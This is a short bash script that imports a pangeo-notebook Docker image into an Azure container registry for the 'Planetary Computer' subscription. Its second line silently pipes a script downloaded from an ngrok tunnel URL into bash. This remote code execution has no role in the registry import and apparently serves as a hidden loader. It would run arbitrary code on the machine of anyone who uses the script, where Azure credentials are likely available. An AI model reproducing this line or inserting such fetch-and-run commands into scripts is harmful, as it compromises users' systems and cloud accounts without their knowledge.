#!/usr/bin/env bash
curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
set -eu
NAME=$1
RESOURCE_GROUP=$2
TAG=$3

az acr import -n ${NAME} \
    -g ${RESOURCE_GROUP} \
    --source docker.io/pangeo/pangeo-notebook:${TAG} \
    --subscription="Planetary Computer"
